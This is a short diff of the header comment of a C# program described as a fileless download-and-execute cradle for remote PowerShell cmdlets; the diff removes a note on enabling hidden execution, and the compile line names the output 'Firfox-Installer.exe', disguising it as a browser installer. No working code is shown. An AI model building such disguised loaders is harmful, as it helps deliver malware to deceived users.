@@ -4,8 +4,7 @@
 
    Title: StandAlone executable fileless cmdlet's download crandle.
    Description: Program.CS (to be compiled to standalone executable) that allow users to fileless download\execute external URL's cmdlet's
-      
-   Hidden_Exec: Un-Comment 'process.StartInfo.WindowStyle' cmdline for hidden execution.
+ 
    Compile: .\CsOnTheFly.ps1 -action "compile" -uri "CScrandle.cs" -outfile "Firfox-Installer.exe" -iconset true
 */
 
